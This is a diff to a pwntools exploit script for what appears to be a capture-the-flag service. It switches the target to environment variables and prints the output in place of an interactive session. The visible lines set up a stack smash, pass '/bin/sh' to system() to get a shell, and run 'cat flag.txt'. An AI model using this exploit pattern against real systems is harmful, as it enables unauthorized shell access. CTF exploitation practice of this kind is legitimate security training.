@@ -1,3 +1,5 @@
+import os
+
 from pwn import *
 from ctypes import CDLL
 
@@ -15,7 +17,7 @@ libcelf = ELF("libc.so.6")
 #    b * main+602
 #""")
 
-p = remote("10.20.10.10", 9204)
+p = remote(os.environ["SERVICE_APP_MAIN_HOST"], int(os.environ["SERVICE_APP_MAIN_PORT"]))
 
 # Set up stack smashing
 p.recvuntil(b"name: ")
@@ -98,4 +100,4 @@ p.recvuntil(b"name:")
 p.sendline(b"/bin/sh") # Set our name to /bin/sh
 p.sendline(b"cat flag.txt") # strcpy will not execute shell using system
 
-p.interactive()
+print(p.recvall(timeout=10).decode(errors="replace"))
